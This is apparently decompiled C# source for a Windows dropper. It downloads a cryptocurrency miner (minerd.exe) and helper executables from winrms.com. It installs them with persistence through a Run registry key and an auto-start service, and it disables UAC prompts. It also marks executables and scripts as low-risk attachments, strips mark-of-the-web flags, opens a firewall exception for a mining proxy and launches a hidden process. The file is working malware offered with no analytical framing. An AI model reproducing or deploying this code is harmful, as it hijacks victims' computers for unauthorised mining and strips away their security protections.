using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;

namespace DirTest;

internal static class Program
{
	public enum ServiceManagerRights
	{
		Connect = 1,
		CreateService = 2,
		EnumerateService = 4,
		Lock = 8,
		QueryLockStatus = 16,
		ModifyBootConfig = 32,
		StandardRightsRequired = 983040,
		AllAccess = 983103
	}

	[Flags]
	public enum ServiceRights
	{
		QueryConfig = 1,
		ChangeConfig = 2,
		QueryStatus = 4,
		EnumerateDependants = 8,
		Start = 0x10,
		Stop = 0x20,
		PauseContinue = 0x40,
		Interrogate = 0x80,
		UserDefinedControl = 0x100,
		Delete = 0x10000,
		StandardRightsRequired = 0xF0000,
		AllAccess = 0xF01FF
	}

	public enum ServiceBootFlag
	{
		Start,
		SystemStart,
		AutoStart,
		DemandStart,
		Disabled
	}

	public enum ServiceState
	{
		Unknown = -1,
		NotFound,
		Stop,
		Run,
		Stopping,
		Starting
	}

	public enum ServiceControl
	{
		Stop = 1,
		Pause,
		Continue,
		Interrogate,
		Shutdown,
		ParamChange,
		NetBindAdd,
		NetBindRemove,
		NetBindEnable,
		NetBindDisable
	}

	public enum ServiceError
	{
		Ignore,
		Normal,
		Severe,
		Critical
	}

	public class ServiceInstaller
	{
		[StructLayout(LayoutKind.Sequential)]
		private class SERVICE_STATUS
		{
			public int dwServiceType;

			public ServiceState dwCurrentState;

			public int dwControlsAccepted;

			public int dwWin32ExitCode;

			public int dwServiceSpecificExitCode;

			public int dwCheckPoint;

			public int dwWaitHint;
		}

		private const int STANDARD_RIGHTS_REQUIRED = 983040;

		private const int SERVICE_WIN32_OWN_PROCESS = 16;

		[DllImport("advapi32.dll")]
		private static extern IntPtr OpenSCManagerA(string lpMachineName, string lpDatabaseName, ServiceManagerRights dwDesiredAccess);

		[DllImport("advapi32.dll", CharSet = CharSet.Ansi)]
		private static extern IntPtr OpenServiceA(IntPtr hSCManager, string lpServiceName, ServiceRights dwDesiredAccess);

		[DllImport("advapi32.dll")]
		private static extern IntPtr CreateServiceA(IntPtr hSCManager, string lpServiceName, string lpDisplayName, ServiceRights dwDesiredAccess, int dwServiceType, ServiceBootFlag dwStartType, ServiceError dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lp, string lpPassword);

		[DllImport("advapi32.dll")]
		private static extern int CloseServiceHandle(IntPtr hSCObject);

		[DllImport("advapi32.dll")]
		private static extern int QueryServiceStatus(IntPtr hService, SERVICE_STATUS lpServiceStatus);

		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern int DeleteService(IntPtr hService);

		[DllImport("advapi32.dll")]
		private static extern int ControlService(IntPtr hService, ServiceControl dwControl, SERVICE_STATUS lpServiceStatus);

		[DllImport("advapi32.dll")]
		private static extern int StartServiceA(IntPtr hService, int dwNumServiceArgs, int lpServiceArgVectors);

		public static void Uninstall(string ServiceName)
		{
			IntPtr intPtr = OpenSCManager(ServiceManagerRights.Connect);
			try
			{
				IntPtr intPtr2 = OpenServiceA(intPtr, ServiceName, ServiceRights.StandardRightsRequired | ServiceRights.QueryStatus | ServiceRights.Stop);
				if (intPtr2 == IntPtr.Zero)
				{
					throw new ApplicationException("Service not installed.");
				}
				try
				{
					StopService(intPtr2);
					if (DeleteService(intPtr2) == 0)
					{
						int lastWin32Error = Marshal.GetLastWin32Error();
						throw new ApplicationException("Could not delete service " + lastWin32Error);
					}
				}
				finally
				{
					CloseServiceHandle(intPtr2);
				}
			}
			finally
			{
				CloseServiceHandle(intPtr);
			}
		}

		public static bool ServiceIsInstalled(string ServiceName)
		{
			IntPtr intPtr = OpenSCManager(ServiceManagerRights.Connect);
			try
			{
				IntPtr intPtr2 = OpenServiceA(intPtr, ServiceName, ServiceRights.QueryStatus);
				if (intPtr2 == IntPtr.Zero)
				{
					return false;
				}
				CloseServiceHandle(intPtr2);
				return true;
			}
			finally
			{
				CloseServiceHandle(intPtr);
			}
		}

		public static void InstallAndStart(string ServiceName, string DisplayName, string FileName)
		{
			IntPtr intPtr = OpenSCManager((ServiceManagerRights)3);
			try
			{
				IntPtr intPtr2 = OpenServiceA(intPtr, ServiceName, ServiceRights.QueryStatus | ServiceRights.Start);
				if (intPtr2 == IntPtr.Zero)
				{
					intPtr2 = CreateServiceA(intPtr, ServiceName, DisplayName, ServiceRights.QueryStatus | ServiceRights.Start, 16, ServiceBootFlag.AutoStart, ServiceError.Normal, FileName, null, IntPtr.Zero, null, null, null);
				}
				if (intPtr2 == IntPtr.Zero)
				{
					throw new ApplicationException("Failed to install service.");
				}
				try
				{
					StartService(intPtr2);
				}
				finally
				{
					CloseServiceHandle(intPtr2);
				}
			}
			finally
			{
				CloseServiceHandle(intPtr);
			}
		}

		public static void StartService(string Name)
		{
			IntPtr intPtr = OpenSCManager(ServiceManagerRights.Connect);
			try
			{
				IntPtr intPtr2 = OpenServiceA(intPtr, Name, ServiceRights.QueryStatus | ServiceRights.Start);
				if (intPtr2 == IntPtr.Zero)
				{
					throw new ApplicationException("Could not open service.");
				}
				try
				{
					StartService(intPtr2);
				}
				finally
				{
					CloseServiceHandle(intPtr2);
				}
			}
			finally
			{
				CloseServiceHandle(intPtr);
			}
		}

		public static void StopService(string Name)
		{
			IntPtr intPtr = OpenSCManager(ServiceManagerRights.Connect);
			try
			{
				IntPtr intPtr2 = OpenServiceA(intPtr, Name, ServiceRights.QueryStatus | ServiceRights.Stop);
				if (intPtr2 == IntPtr.Zero)
				{
					throw new ApplicationException("Could not open service.");
				}
				try
				{
					StopService(intPtr2);
				}
				finally
				{
					CloseServiceHandle(intPtr2);
				}
			}
			finally
			{
				CloseServiceHandle(intPtr);
			}
		}

		private static void StartService(IntPtr hService)
		{
			new SERVICE_STATUS();
			StartServiceA(hService, 0, 0);
			WaitForServiceStatus(hService, ServiceState.Starting, ServiceState.Run);
		}

		private static void StopService(IntPtr hService)
		{
			SERVICE_STATUS lpServiceStatus = new SERVICE_STATUS();
			ControlService(hService, ServiceControl.Stop, lpServiceStatus);
			WaitForServiceStatus(hService, ServiceState.Stopping, ServiceState.Stop);
		}

		public static ServiceState GetServiceStatus(string ServiceName)
		{
			IntPtr intPtr = OpenSCManager(ServiceManagerRights.Connect);
			try
			{
				IntPtr intPtr2 = OpenServiceA(intPtr, ServiceName, ServiceRights.QueryStatus);
				if (!(intPtr2 == IntPtr.Zero))
				{
					try
					{
						return GetServiceStatus(intPtr2);
					}
					finally
					{
						CloseServiceHandle(intPtr);
					}
				}
				return ServiceState.NotFound;
			}
			finally
			{
				CloseServiceHandle(intPtr);
			}
		}

		private static ServiceState GetServiceStatus(IntPtr hService)
		{
			SERVICE_STATUS sERVICE_STATUS = new SERVICE_STATUS();
			if (QueryServiceStatus(hService, sERVICE_STATUS) == 0)
			{
				throw new ApplicationException("Failed to query service status.");
			}
			return sERVICE_STATUS.dwCurrentState;
		}

		private static bool WaitForServiceStatus(IntPtr hService, ServiceState WaitStatus, ServiceState DesiredStatus)
		{
			SERVICE_STATUS sERVICE_STATUS = new SERVICE_STATUS();
			QueryServiceStatus(hService, sERVICE_STATUS);
			if (sERVICE_STATUS.dwCurrentState == DesiredStatus)
			{
				return true;
			}
			int tickCount = Environment.TickCount;
			int dwCheckPoint = sERVICE_STATUS.dwCheckPoint;
			while (sERVICE_STATUS.dwCurrentState == WaitStatus)
			{
				int num = sERVICE_STATUS.dwWaitHint / 10;
				if (num < 1000)
				{
					num = 1000;
				}
				else if (num > 10000)
				{
					num = 10000;
				}
				Thread.Sleep(num);
				if (QueryServiceStatus(hService, sERVICE_STATUS) == 0)
				{
					break;
				}
				if (sERVICE_STATUS.dwCheckPoint > dwCheckPoint)
				{
					tickCount = Environment.TickCount;
					dwCheckPoint = sERVICE_STATUS.dwCheckPoint;
				}
				else if (Environment.TickCount - tickCount > sERVICE_STATUS.dwWaitHint)
				{
					break;
				}
			}
			return sERVICE_STATUS.dwCurrentState == DesiredStatus;
		}

		private static IntPtr OpenSCManager(ServiceManagerRights Rights)
		{
			IntPtr intPtr = OpenSCManagerA(null, null, Rights);
			if (intPtr == IntPtr.Zero)
			{
				throw new ApplicationException("Could not connect to service control manager.");
			}
			return intPtr;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteFile(string name);

	[STAThread]
	private static void Main(string[] args)
	{
		try
		{
			string text = "http://winrms.com";
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\winrms";
			write_to_log(text2);
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
				write_to_log("download");
				if (!Directory.Exists(text2 + "\\cp32"))
				{
					Directory.CreateDirectory(text2 + "\\cp32");
				}
				if (!Directory.Exists(text2 + "\\version"))
				{
					Directory.CreateDirectory(text2 + "\\version");
				}
				using WebClient webClient = new WebClient();
				webClient.DownloadFile(text + "/winrms.exe", text2 + "\\winrms.exe");
				webClient.DownloadFile(text + "/version.xml", text2 + "\\version.xml");
				webClient.DownloadFile(text + "/servicerms.exe", text2 + "\\servicerms.exe");
				webClient.DownloadFile(text + "/setup.exe", text2 + "\\setup.exe");
				webClient.DownloadFile(text + "/libcurl-4.dll", text2 + "\\libcurl-4.dll");
				webClient.DownloadFile(text + "/libwinpthread-1.dll", text2 + "\\libwinpthread-1.dll");
				webClient.DownloadFile(text + "/zlib1.dll", text2 + "\\zlib1.dll");
				webClient.DownloadFile(text + "/minerd.exe", text2 + "\\minerd.exe");
				webClient.DownloadFile(text + "/cp32/libcurl-4.dll", text2 + "\\cp32\\libcurl-4.dll");
				webClient.DownloadFile(text + "/cp32/minerd.exe", text2 + "\\cp32\\minerd.exe");
				webClient.DownloadFile(text + "/cp32/pthreadGC2.dll", text2 + "\\cp32\\pthreadGC2.dll");
				webClient.DownloadFile(text + "/cp32/zlib1.dll", text2 + "\\cp32\\zlib1.dll");
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("ApplicationName", text2 + "\\setup.exe");
			ServiceInstaller.InstallAndStart("MyServiceName", "MyServiceDisplayName", text2 + "\\servicerms.exe");
			registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			}
			registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey.SetValue("EnableLUA", 0);
			registryKey.SetValue("ConsentPromptBehaviorAdmin", 0);
			registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments", writable: true);
			if (registryKey == null)
			{
				registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments");
			}
			registryKey.SetValue("LowRiskFileTypes", ".exe;.bat;.reg;.vbs");
			Unblock(text2 + "\\setup.exe");
			string arguments = "firewall add allowedprogram \"" + text2 + "\\mining_proxy.exe\" \"MyApp\" ENABLE";
			ProcessStartInfo processStartInfo = new ProcessStartInfo("netsh", arguments);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process.Start(processStartInfo);
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i < processes.Length; i++)
			{
				if (processes[i].ProcessName == "winrms")
				{
					processes[i].Kill();
				}
			}
			if (File.Exists(text2 + "\\version\\winrms.exe"))
			{
				Thread.Sleep(5000);
				File.Copy(text2 + "\\version\\winrms.exe", text2 + "\\winrms.exe", overwrite: true);
				File.Delete(text2 + "\\version\\winrms.exe");
			}
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2 + "\\winrms.exe");
			processStartInfo2.UseShellExecute = false;
			processStartInfo2.RedirectStandardError = true;
			processStartInfo2.RedirectStandardInput = true;
			processStartInfo2.RedirectStandardOutput = true;
			processStartInfo2.CreateNoWindow = true;
			processStartInfo2.Arguments = "setup";
			processStartInfo2.ErrorDialog = false;
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo2);
		}
		catch (Exception ex)
		{
			write_to_log(ex.ToString());
		}
	}

	public static bool Unblock(string fileName)
	{
		return DeleteFile(fileName + ":Zone.Identifier");
	}

	private static void write_to_log(string text)
	{
		StreamWriter streamWriter = (File.Exists("c:\\dir.txt") ? File.AppendText("c:\\dir.txt") : new StreamWriter("c:\\dir.txt"));
		streamWriter.WriteLine(DateTime.Now);
		streamWriter.WriteLine(text);
		streamWriter.WriteLine();
		streamWriter.Close();
	}

	private static string GetMacAddress()
	{
		string result = string.Empty;
		long num = -1L;
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		foreach (NetworkInterface networkInterface in allNetworkInterfaces)
		{
			string text = networkInterface.GetPhysicalAddress().ToString();
			if (networkInterface.Speed > num && !string.IsNullOrEmpty(text) && text.Length >= 12)
			{
				num = networkInterface.Speed;
				Console.WriteLine(networkInterface.Speed);
				result = text;
			}
		}
		return result;
	}
}
